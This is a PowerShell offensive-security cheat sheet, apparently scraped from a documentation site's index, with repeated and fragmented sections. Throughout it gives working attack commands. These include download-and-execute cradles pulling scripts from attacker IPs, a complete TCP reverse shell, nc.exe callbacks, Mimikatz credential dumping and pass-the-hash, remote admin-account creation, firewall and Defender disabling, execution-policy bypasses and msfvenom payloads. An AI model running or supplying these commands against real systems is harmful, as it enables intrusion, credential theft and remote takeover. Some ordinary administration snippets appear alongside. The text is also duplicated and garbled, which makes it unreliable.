possible to see remote jobs using Get - Job . .Net Exploring Assemblies Finding assemblies $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () | ForEach - Object {$ _ . GetTypes () } | Where - Object {$ _ . IsPublic - eq True } Working with assemblies and invoking functions $ProcClass = $Classes | Where-Object { $_.Name - eq Proccess } $ProcClass | Get-Members $ProcClass | Get-Members -MemberType Method -Static $ProcClass.GetMethods() $ProcClass::GetCurrentProcess() $ProcClass.FullName [System.Diagnostic.Process]::GetCurrentProcess() [System.Diagnostic.Process] | Get-Members -MemberType Method -Static | Format-List * Add - Type - AssemblyName System . Windows . Forms [ System . Windows . Forms . Sendkeys ] AssemblyName Add - Type - AssemblyName System . ServiceProcess [ System . ServiceProcess . ServiceController ] | Get - Members - MemberType Method - Static | Format - List * [ System . ServiceProcess . ServiceController ]:: GetDevices () TypeDefinition $ DotnetCode = @ public class SysCommands public static void lookup ( string domainname ) { System . Diagnostics . Process . Start ( ns lookup.exe , domainname ) ; } public void netcmd ( string cmd ) { string cmdstring = /k net.exe + cmd ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ) ; } public static void Main () { string cmdstring = /k net.exe + user ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ); } @ # Compile .Net code and load objects from it Add - Type - TypeDefinition $ DotnetCode - OutputType Library - OutputAssembly SysCommand . dll Add - Type - TypeDefinition $ DotnetCode - OutputType ConsoleApplication - OutputAssembly SysCommand . exe [ SysCommand ] :: lookup ( google.com ) # Load objects from a DLL into Memory $ obj = Add - Type - Path SysCommand . dll - PassThru $ obj | Get - Members [ SysCommand ] :: lookup ( google.com ) # Calling non-static functions $ obj = New - Object SysCommands $ obj . netcmd ( user ) # MemberDefinition - DLL Import $ Apicode = @ [ DllImport ( kerne132.d11 )] public static extern bool CreateSymbolicLink ( string IpSymlinkFileName , string IpTargetFileName , int dwFlags ); @ $ SymLink = Add - Type - MemberDefinition $ ApiCode - Name Symlink - Namespace CreatSymLink - PassThru $ SymLink :: CreateSymbolicLink ( C : \\ test \\ link , C : \\ Users \\ , 1 ) WMI Exploring namespaces Get - WmiObject - Namespace root - Class __Namespace | select name List even the nested namespaces - http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/ Exploring Classes Get - WmiObject \u2013 NameSpace \u201c namespace \u201d \u2013 List Exploring Methods Get - WmiObject - Class class - List | Select - Object - ExpandProperty Methods Filter based on properties of objects getting returned Get-WmiObject -Class Win32_Process -Filter (Name = powershell.exe ) Get-WmiObject -Class Win32_Process | Where-Object { $_.Name - eq powershell.exe } Get-WmiObject -Query { Select * from Win32_Process where Name = powershell.exe } Remove - WmiObject Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe - ComputerName name - Credential cred COM Objects Explore available COM objects: Get - ChildItem REGISTRY :: HKEY_CLASSES_ROOT \\ CLSID - include PROGID - recurse | foreach {$ _ . GetValue ( ) } | Where - Object {$ _ - match \u201c appname } ``` $wscript = New-Object -ComObject WScript.Shell.1 $wscript | Get-Member $wscript.CurrentDirectory $wscript.SendKeys(\"Hello\") $wscript.Exec(\"cmd\") $wscript.CreateShortcut(...) Interesting COM Objects - WScript . Shell . 1 - Shell . Applcation . 1 ## Windows Registry Get-Item 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version' Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version' -Recurse Get-Provider -PSProvider Registry Due to above provider it s possible to use registry as filesystem . Set-Location Registry:: ls cd HKLM ls New-PSDrive -name RegistryDrive -PSProvider Registry -Root Registry:: dir Get-PSDrive New-Item -Path HKCU:\\Test\\New New-ItemProperty -Path HKCU:\\Test\\New -Name Reg2 -PropertyType String -Value 2 Rename-Item HKCU:\\Test -NewName HKCU:TestNew Rename-ItemProperty HKCU:\\Test\\New -Name Reg2 -NewName Reg3 Set-ItemProperty -Path HKCU:\\Test\\New -Name Reg2 -Value 3 ## Recon - Directory search : ` Get - HttpStatus ` ## Client Side Attacks - Out - Word - Out - Excel - Out - CHM - Out - Shortcut - Out - HTA - Out - Java ## Encoding - ` Invole - Encode - DataToEncode example . ps1 - OutCommand ` - ` Out - CHM - Payload -e encodedValue ` ## Metasploit - Using Powershell with Metasploit : [ https : // github . com / rapid7 / metasploit - framework / wiki / How - to - use - Powershell - in - an - exploit ]( https : // github . com / rapid7 / metasploit - framework / wiki / How - to - use - Powershell - in - an - exploit ) msfvenom meterpreter ./msfvenom -p windows/x64/meterpreter/reverse_https LHOST= -f psh-reflection cmd/windows/reverse_powershell Useful modules : - exploit / windows / smb / psexec_psh - Payload is encoded - exploit / windows / local / powershell_cmd_upgrade - Upgrade native to Powershell - post / windows / manage / powershell / exec_powershell - exploit / multi / script / web_delivery ## Pass the Hash with Powershell .\\wce.exe \u2013s -c PowerShell.exe Invoke-Mimikatz -Command \"'\"sekurlsa::pth /user:Administrator /domain:. /ntlm: /run:powershell.exe'\"\" http : // www . pwnag3 . com / 2014 / 05 / what - did - microsoft - just - break - with . html ## Persistence - WMI permanent event consumers - Windows registry - Scheduled tasks ## Restricting Powershell - http : // www . darkoperator . com / blog / 2013 / 3 / 21 / powershell - basics - execution - policy - and - code - signing - part - 2 . html - Process tracking and Module logging . - ACL , Software Restriction Policies ( SRP ) and Application Control Policies ( Applocker ) could be used to control PowerShell . - Both aresupported by GPO , your mileage may vary according to your implementation preferences . - ` __PSLockDownPolicy ` ( v3 only ) - Just Enough Admin \u2013 Restrict Administrative Rights - http : // blogs . technet . com / b / privatecloud / archive / 2014 / 05 / 14 / just - enough - administration - step - by - step . aspx - Auditing , Base lining and Incident Management - PoshSec - https : // github . com / PoshSec - Kansa - https : // github . com / davehull / Kansa - Voyeur - https : // github . com / silverhack / voyeur / - Using Virus Total API - https : // github . com / darkoperator / Posh - VirusTotal - Bypassing Applocker Policies - http : // www . sixdub . net / 2014 / 12 / 02 / inexorable - powershell - a - red - teamers - tale - of - overcoming - simple - applocker - policies / - https : // github . com / Veil - Framework / PowerTools / tree / master / PowerPick - Investigating PowerShell attacks https : // www . defcon . org / images / defcon - 22 / dc - 22 - presentations / Kazanciyan - Hastings / DEFCON - 22 - Ryan - Kazanciyan - Matt - Hastings - Investigating - Powershell - Attacks - UPDATED . pdf ## Save output Get-Service | Export-CSV C:\\Temp\\AllServices.CSV \u2013NoTypeInfo Get-User \u2013Filter \u2018Name \u2013Like \u201c*John\u201d\u2019 | Export-CSV C:\\Temp\\AllUsers.CSV \u2013NoTypeInfo Get-ChildItem \u2013Path C:\\Windows\\System32 | Export-CSV C:\\Temp\\AllFiles.CSV -NoTypeInfo - Reboots : ` Get - EventLog \u2013 Log System \u2013 Newest 100 | Where - Object {$ _ . EventID \u2013 eq \u2018 1074 \u2019} | FT MachineName , UserName , TimeGenerated - AutoSize ` - Search hotfix : ` Get - HotFix \u2013 ID KB2877616 ` - Backup Group Policy : ` Backup - GPO \u2013 All \u2013 Path C :\\ Temp \\ AllGPO ` - Check if all DCs are Global Catalog Servers : ` Get - ADDomainController \u2013 Filter * | Select Hostname , IsGlobalCatalog ` - ## Permissions icacls \"C:\\Program Files (x86)\\Program Folder\" OI This folder and files CI This folder and subfolders IO The ACE does not apply to the current file/directory. No output message: This folder only (IO)(CI) This folder, subfolders and files (OI)(CI)(IO) Subfolders and files only (CI)(IO) Subfolders only (OI)(IO) Files only [ https : // docs . microsoft . com / en - us / previous - versions / windows / it - pro / windows - xp / bb490872 ( v = technet . 10 )]( https : // docs . microsoft . com / en - us / previous - versions / windows / it - pro / windows - xp / bb490872 ( v = technet . 10 )) ## Powershell with HID - https : // github . com / samratashok / Kautilya / - http : // www . labofapenetrationtester . com / search / label / Kautilya - http : // www . irongeek . com / i . php ? page = security / plug - and - prey - malicious - usb - devices https : // github . com / subTee / CVE - 2014 - 4113 / blob / master / Invoke - SystemShell . ps1 http : // www . labofapenetrationtester . com / 2014 / 12 / using - nishang - with - cobalt - strike . html http : // blog . cobaltstrike . com / 2014 / 09 / 23 / cobalt - strike - 2 - 1 - i - have - the - powershell / powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/PowerUp.ps1 ')\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/Sherlock.ps1 ')\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/MS16-032.ps1 ')\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/MS16-135.ps1 ')\" \\10.11.0.125\\share\\41015.exe \\10.11.0.125\\share\\SetWindowLongPtr_Exploit.exe powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/Invoke-WMIExec.ps1 '); Invoke-WMIExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/Invoke-SMBExec.ps1 '); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'net localgroup administrators bethany /add' -verbose\" PsExec64.exe \\localhost -u alice -p aliceishere cmd powershell -ExecutionPolicy Bypass C:\\Users\\Bethany\\Desktop\\PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd powershell.exe -exec Bypass -C \"$action = New-ScheduledTaskAction -Execute netsh -Argument 'firewall set opmode disable'; $trigger = New-ScheduledTaskTrigger -Once -At $startTime -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([Timespan]::MaxValue); $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel; Register-ScheduledTask -TaskName 'amx1' -TaskPath 'C:\\Windows\\System32\\' -Action $action -Trigger $trigger -User 'alice' -Password 'aliceishere' -Settings $settings\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/runas.ps1 ')\" cmd /C echo \"aliceishere\" | runas /user:alice \"cmd\" Option explicit dim oShell set oShell= Wscript.CreateObject(\"WScript.Shell\") oShell.Run \"C:\\Users\\Bethany\\Desktop\\nc.exe -e cmd.exe 10.11.0.125 9999\" WScript.Sleep 100 oShell.Sendkeys \"aliceishere~\u201d Wscript.Quit // CScript / WScript $username = 'alice' $password = 'aliceishere' $securePassword = ConvertTo-SecureString $password -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword Start-Process 'C:\\Users\\Bethany\\Desktop\\nc.exe' -ArgumentList '-e cmd.exe 10.11.0.125 9999' -Credential $credential powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/runas.ps1 ')\" ```","title":"Cheatsheet"},{"location":"os/windows/powershell/0-cheatsheet/#cheatsheet","text":"Using command line (why not run direcrly???) echo IEX ( New - Object Net . WebClient ). DownloadString ( http://10.10.14.17:8000/Sherlock.ps1 ) | PowerShell - Noprofile -","title":"Cheatsheet"},{"location":"os/windows/powershell/0-cheatsheet/#versions","text":"v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1) v3: Windows 8 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) (no XP support) v4: Windows 8.1 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) v5: Part of Windows Management Framework (WMF) 5.0. February 24, 2016. Features OneGet PowerShell cmdlets to support Chocolatey's repository-based apps. Ability to manage layer 2 network switches Windows 10 Anniversary Update Available for Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2 v6: PowerShell Core on 18 August 2016 Get - Host | Select - Object Version $ PSVersionTable","title":"Versions"},{"location":"os/windows/powershell/0-cheatsheet/#references","text":"https://pinvoke.net - Allowing developers to find, edit and add PInvoke * signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET). An A-Z Index of Windows PowerShell commands: https://ss64.com/ps/ Windows PowerShell command line syntax: https://ss64.com/ps/syntax.html","title":"References"},{"location":"os/windows/powershell/0-cheatsheet/#help-system","text":"Versin information: $ PSVersionTable Get - Help Get - Process help Get - Process Update - Help Get - Help remoting Get - Help about_ * remot * 64 bit %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).DownloadString( http://10.10.14.17/Invoke-PowerShellTcp.ps1 ) 32 bit START / MIN / LOW CMD / C % SystemRoot % \\ system32 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe IEX(New-Object Net.Webclient).DownloadString( http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1 )","title":"Help System"},{"location":"os/windows/powershell/0-cheatsheet/#basic-constructs","text":"Cmdlets Function","title":"Basic Constructs"},{"location":"os/windows/powershell/0-cheatsheet/#list-all-cmdlets","text":"Get - Command - CommandTyle Cmdlet","title":"List all Cmdlets"},{"location":"os/windows/powershell/0-cheatsheet/#aliases","text":"Get - Alias - Name ps Get - Alias - Definition Get - Process","title":"Aliases"},{"location":"os/windows/powershell/0-cheatsheet/#check-environment","text":"C : \\ WIndows \\ Syswow64 \\ Windowspowershell \\ v1 . 0 \\ powershell . exe PSModulePath Version info: powershell - v 2 . 0 - c $ psversiontable Language mode: $ host . runspace . languagemode Check if AppLocker is enabled: Get - AppLockerPolicy - Local Powershell Version: ( Get - Host ). Version 64bit version: %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe","title":"Check Environment"},{"location":"os/windows/powershell/0-cheatsheet/#download-files","text":"powershell wget http://example.com/abc.txt -outfile abc.txt Invoke-WebRequest -Uri http://192.168.0.17/PS_TCP4.ps1 -OutFile $fullpath ; powershell - c Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\\Users\\kostas\\Desktop\\41020.exe echo $ webclient = New - Object System . Net . WebClient wget . ps1 echo $ url = http://10.10.10.10/example.exe wget . ps1 echo $ file = example.exe wget . ps1 echo $ webclient . DownloadFile ( $ url , $ file ) wget . ps1 powershell . exe - ExecutionPolicy Bypass - NoLogo - NonInterative - NoProfile - File wget . ps1","title":"Download Files"},{"location":"os/windows/powershell/0-cheatsheet/#base64-encoded-payload-delivery","text":"echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis - 32 - U administrator % badpassword // 10 . 10 . 10 . 10 cmd.exe /c powershell.exe -nop -enc base64-value","title":"Base64 encoded payload delivery"},{"location":"os/windows/powershell/0-cheatsheet/#execution-policy","text":"powershell.exe -exec Bypass Not a security feature Used to avoid accidental script execution Can be bypass with: powershell - ExecutionPolicy bypass . \\ example . ps1 powershell - c cmd powershell - EncodedCommand cmd powershell - enc cmd $ env : PSExecutionPolicyPreference = bypass Ref https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6 15 ways to bypass PowerShell execution policy: https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy","title":"Execution Policy"},{"location":"os/windows/powershell/0-cheatsheet/#revserse-shell","text":"Start-Process -FilePath \u201c powershell \u201d -argumentlist \u201c IEX ( New-Object Net . WebClient ). downloadString ( \u2018 http : // 10 . 10 . 14 . 30 / adminshell . ps1 \u2019 ) \u201d -Credential $cred msfvenom -a x86 - -platform Windows -p windows / exec CMD = powershell -c iex(new-object net.webclient).downloadstring( http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1 ) -e x86 / unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister = EAX -f python shellcode http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html $client = New-Object System . Net . Sockets . TCPClient ( 10.10.10.10 , 80 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 1 | Out-String ); $sendback2 = $sendback + PS + ( pwd ). Path + ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close ()","title":"Revserse Shell"},{"location":"os/windows/powershell/0-cheatsheet/#modules","text":"Import - Module path_to_module - verbose List all available modules: Get - Module - ListAvailable - All List all modules available in: $ env : PSModulePath All functions exposed by a module: Get - Command - Module module_name","title":"Modules"},{"location":"os/windows/powershell/0-cheatsheet/#remote-script-execution","text":"Invoke-Expression ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); iex ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); powershell - EncodedCommand Base64EncodedCommand START / B powershell -c IEX ( New-Object Net . Webclient ). downloadstring ( http://10.10.14.2/shell.ps1 ) /B prevents creation of a new window Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter More Download Cradles $ ie = New-Object -ComObject InternetExplorer . Application ;$ ie . visible =$ False ;$ ie . navigate ( http://example.com/example.ps1 ); sleep 5 ;$ resp =$ ie . Document . Body . innerHTML ;$ ie . quit (); iex $ resp iex ( iwr http://example.com/example.ps1 )","title":"Remote Script execution"},{"location":"os/windows/powershell/0-cheatsheet/#hnew-object-comobject-msxm12xmlhttphopenget-http1921682301evilpsi1-falsehsendiex-h-responsetext","text":"$wr [System.NET.WebRequest] :: Create ( http://192.168.230.1/evil.psi ) $r = $wr . GetResponse () IEX ( [System.IO.StreamReader] ( $r . GetResponseStream ())) . ReadToEnd ()```","title":"$h=New-Object -ComObject Msxm12.XMLHTTP;$h.open(&#39;GET&#39;, &#39;http://192.168.230.1/evil.psi1&#39; ,$false);$h.send();iex $h. responseText"},{"location":"os/windows/powershell/0-cheatsheet/#command-history-psreadline","text":"cat ( Get - PSReadlineOption ). HistorySavePath | sls password By default, the path is: profile : \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ PowerShell \\ PSReadline \\ ConsoleHost_history . txt","title":"Command History (PSReadline)"},{"location":"os/windows/powershell/0-cheatsheet/#powershell-remoting","text":"Enabled by default from Windows Server 2012 Enable - PSRemoting - Force Admin privileges are required to connect Get - Command - CommandType cmdlet - ParameterName computername Get-Command -CommandType cmdlet | Where-Object { $_Parameters.Keys -- contains ComputerName - and $_Parameters.Keys -- contains Credential - and $_Parameters.Keys -- notcontains Session }","title":"Powershell Remoting"},{"location":"os/windows/powershell/0-cheatsheet/#wsman-webservicesmanagement-protocol-winrm","text":"WinRM is Microsoft\u2019s implementation of WSMAN Port 5985, 5986 If target is in a workgroup, attacker's machine should trust target machine to send out credentials: Set-Item WSMan:\\localhost\\client\\trustedhosts -Value * Invoke-Command -ScriptBlock { $env : ComputerName } -ComputerName example -Credential dominName/userName - FilePath Invoke - WSManAction - Action Create - ResourceURI wmicimv2 / win32_process - ValueSet @ { commandline = powershell.exe -c Get-Process } - ComputerName domainpc \u2013 Credential Invoke - WSManAction - Action Create - ResourceURI wmicimv2 / win32_process - ValueSet @ { commandline = powershell.exe -c iex ((New-Object Net.Webclient).DownloadString( http://192.168.254. 1/reverse_powershell.ps1 )) } - ComputerName domainpc","title":"WSMAN (WebServicesManagement) Protocol (WinRM)"},{"location":"os/windows/powershell/0-cheatsheet/#wsman-vs-powershell-remoting-vs-wmi","text":"WSMAN Firewall friendly Use HTTP and HTTPS ports Syntax is complex Returns immutable objects Can be used with non-Windows machines Powershell Remoting Firewall friendly Easy use Returns immutable objects WMI Not firewall friendly Not NAT friendly Complex Returns editable objects","title":"WSMAN vs PowerShell Remoting vs WMI"},{"location":"os/windows/powershell/0-cheatsheet/#one-to-one","text":"Invoke - Command is stateless for stageful operations use PSSession Interactive, stateful session Run in a new process wsmprovhost New-PSSession $ ses = New - PSSession - ComputerName name - Credential cred Get - PSSession Enter - PSSession Define a function in a remote machine and call it: Invoke - Command - ScriptBlock { function Example1 { whoami ; }} - Session $ ses Invoke - Command - ScriptBlock { Example1 } - Session $ ses PSSession - CommandName Example1 - Session $ ses Export a command from a remote machine: Export - PSSession - Module name - CommandName Example1 - Session $ ses Double Hop Problem (Attacker delegate sending token to target-2 from target-1) Enable - WSManCredSSP - Role Client - DelegateComputer Enable - WSManCredSSP - Role Server Get - WSManCredSSP Enter - PSSession - ComputerName name - Credential cred - Authentication CredSSP","title":"One to One"},{"location":"os/windows/powershell/0-cheatsheet/#useful-cmdlets","text":"New-PSSession Enter-PSSession Set - MpPreference - DisableRealtimeMonitoring $ true New - PSSession - ComputerName instance $ sess = New - PSSession - ComputerName instance Enter - PSSEssion - Session $ sess","title":"Useful cmdlets"},{"location":"os/windows/powershell/0-cheatsheet/#one-to-many-fan-out-remoting","text":"Non-interactive Parallel command execution Can execute scripts from files Usable to perform command execution without dropping exe onto disk Useful for passing and replying hashes, tickets and other AD attacks Run commands: Invoke - Command - ScriptBlock { whoami ; hostname } - ComputerName instance Run scripts: Invoke - Command - FilePath example . ps1 - ComputerName instance Run functions installed on the remote box: Invoke-Command -ScriptBlock ${ function : Invoke - Mimikatz } -ComputerName instance Stateful commands: $sess = New-PSSession -ComputerName instance Invoke-Command -Session $sess -ScriptBlock { $proc = Get - Process } Invoke-Command -Session $sess -ScriptBlock { $proc.Name } Mimikatz (ReflectivePEInjection is used to load into memory) Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Pass the Hash Invoke - Mimikatz - Command sekurlsa::pth /user: name_of_the_user /domain:. /ntlm: ntlmhash /run:powershell.exe Invoke - Mimikatz - Command sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe Dump Creds from multiple machines Invoke - Mimikatz - DumpCreds - ComputerName @ ( instance1 , instance2 )","title":"One to Many (Fan-out Remoting)"},{"location":"os/windows/powershell/0-cheatsheet/#load-powerup","text":"powershell - ExecutionPolicy Bypass Import - Module . / PowerUp . ps1 Invoke - AllChecks","title":"Load PowerUp"},{"location":"os/windows/powershell/0-cheatsheet/#active-directory","text":"[ADSI] Get member of the domain admin group ( [ ADSI ] LDAP://cn=Domain Admin,cn=Users,dc=Example,dc=com ). Members Get memberships of a user ( [ ADSI ] LDAP://cn=Administrator,cn=Users,dc=Example,dc=com ). MemberOf .NET Class: System . DirectoryServices . ActiveDirectory Native Executable WMI","title":"Active Directory"},{"location":"os/windows/powershell/0-cheatsheet/#system-information","text":"Get - HotFix","title":"System Information"},{"location":"os/windows/powershell/0-cheatsheet/#jobs","text":"Start - Job - ScriptBlock { whoami } Start - Job - FilePath path Get - Job | Receive - Job Get - Job - id id | Receive - Job Remove - Job Get - Command - ParameterName AsJob Run job on a remote machine using PSSession or by using - AsJob with - ComputerName . With - AsJob it's possible to see remote jobs using Get - Job .","title":"Jobs"},{"location":"os/windows/powershell/0-cheatsheet/#net","text":"","title":".Net"},{"location":"os/windows/powershell/0-cheatsheet/#exploring-assemblies","text":"Finding assemblies $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () $ Classes = [ AppDomain ]:: CurrentDomain . GetAssemblies () | ForEach - Object {$ _ . GetTypes () } | Where - Object {$ _ . IsPublic - eq True } Working with assemblies and invoking functions $ProcClass = $Classes | Where-Object { $_.Name - eq Proccess } $ProcClass | Get-Members $ProcClass | Get-Members -MemberType Method -Static $ProcClass.GetMethods() $ProcClass::GetCurrentProcess() $ProcClass.FullName [System.Diagnostic.Process]::GetCurrentProcess() [System.Diagnostic.Process] | Get-Members -MemberType Method -Static | Format-List * Add - Type - AssemblyName System . Windows . Forms [ System . Windows . Forms . Sendkeys ]","title":"Exploring Assemblies"},{"location":"os/windows/powershell/0-cheatsheet/#assemblyname","text":"Add - Type - AssemblyName System . ServiceProcess [ System . ServiceProcess . ServiceController ] | Get - Members - MemberType Method - Static | Format - List * [ System . ServiceProcess . ServiceController ]:: GetDevices ()","title":"AssemblyName"},{"location":"os/windows/powershell/0-cheatsheet/#typedefinition","text":"$ DotnetCode = @ public class SysCommands public static void lookup ( string domainname ) { System . Diagnostics . Process . Start ( ns lookup.exe , domainname ) ; } public void netcmd ( string cmd ) { string cmdstring = /k net.exe + cmd ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ) ; } public static void Main () { string cmdstring = /k net.exe + user ; System . Diagnostics . Process . Start ( cmd. exe , cmdstring ); } @ # Compile .Net code and load objects from it Add - Type - TypeDefinition $ DotnetCode - OutputType Library - OutputAssembly SysCommand . dll Add - Type - TypeDefinition $ DotnetCode - OutputType ConsoleApplication - OutputAssembly SysCommand . exe [ SysCommand ] :: lookup ( google.com ) # Load objects from a DLL into Memory $ obj = Add - Type - Path SysCommand . dll - PassThru $ obj | Get - Members [ SysCommand ] :: lookup ( google.com ) # Calling non-static functions $ obj = New - Object SysCommands $ obj . netcmd ( user ) #","title":"TypeDefinition"},{"location":"os/windows/powershell/0-cheatsheet/#memberdefinition-dll-import","text":"$ Apicode = @ [ DllImport ( kerne132.d11 )] public static extern bool CreateSymbolicLink ( string IpSymlinkFileName , string IpTargetFileName , int dwFlags ); @ $ SymLink = Add - Type - MemberDefinition $ ApiCode - Name Symlink - Namespace CreatSymLink - PassThru $ SymLink :: CreateSymbolicLink ( C : \\ test \\ link , C : \\ Users \\ , 1 )","title":"MemberDefinition - DLL Import"},{"location":"os/windows/powershell/0-cheatsheet/#wmi","text":"Exploring namespaces Get - WmiObject - Namespace root - Class __Namespace | select name List even the nested namespaces - http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/ Exploring Classes Get - WmiObject \u2013 NameSpace \u201c namespace \u201d \u2013 List Exploring Methods Get - WmiObject - Class class - List | Select - Object - ExpandProperty Methods Filter based on properties of objects getting returned Get-WmiObject -Class Win32_Process -Filter (Name = powershell.exe ) Get-WmiObject -Class Win32_Process | Where-Object { $_.Name - eq powershell.exe } Get-WmiObject -Query { Select * from Win32_Process where Name = powershell.exe } Remove - WmiObject Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe Invoke - WmiMethod - Class Win32_Process - Name Create - ArgumentList notepad.exe - ComputerName name - Credential cred","title":"WMI"},{"location":"os/windows/powershell/0-cheatsheet/#com-objects","text":"Explore available COM objects: Get - ChildItem REGISTRY :: HKEY_CLASSES_ROOT \\ CLSID - include PROGID - recurse | foreach {$ _ . GetValue ( ) } | Where - Object {$ _ - match \u201c appname } ``` $wscript = New-Object -ComObject WScript.Shell.1 $wscript | Get-Member $wscript.CurrentDirectory $wscript.SendKeys(\"Hello\") $wscript.Exec(\"cmd\") $wscript.CreateShortcut(...) Interesting COM Objects - WScript . Shell . 1 - Shell . Applcation . 1 ## Windows Registry Get-Item 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version' Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Current Version' -Recurse Get-Provider -PSProvider Registry Due to above provider it s possible to use registry as filesystem . Set-Location Registry:: ls cd HKLM ls New-PSDrive -name RegistryDrive -PSProvider Registry -Root Registry:: dir Get-PSDrive New-Item -Path HKCU:\\Test\\New New-ItemProperty -Path HKCU:\\Test\\New -Name Reg2 -PropertyType String -Value 2 Rename-Item HKCU:\\Test -NewName HKCU:TestNew Rename-ItemProperty HKCU:\\Test\\New -Name Reg2 -NewName Reg3 Set-ItemProperty -Path HKCU:\\Test\\New -Name Reg2 -Value 3 ## Recon - Directory search : ` Get - HttpStatus ` ## Client Side Attacks - Out - Word - Out - Excel - Out - CHM - Out - Shortcut - Out - HTA - Out - Java ## Encoding - ` Invole - Encode - DataToEncode example . ps1 - OutCommand ` - ` Out - CHM - Payload -e encodedValue ` ## Metasploit - Using Powershell with Metasploit : [ https : // github . com / rapid7 / metasploit - framework / wiki / How - to - use - Powershell - in - an - exploit ]( https : // github . com / rapid7 / metasploit - framework / wiki / How - to - use - Powershell - in - an - exploit ) msfvenom meterpreter ./msfvenom -p windows/x64/meterpreter/reverse_https LHOST= -f psh-reflection cmd/windows/reverse_powershell Useful modules : - 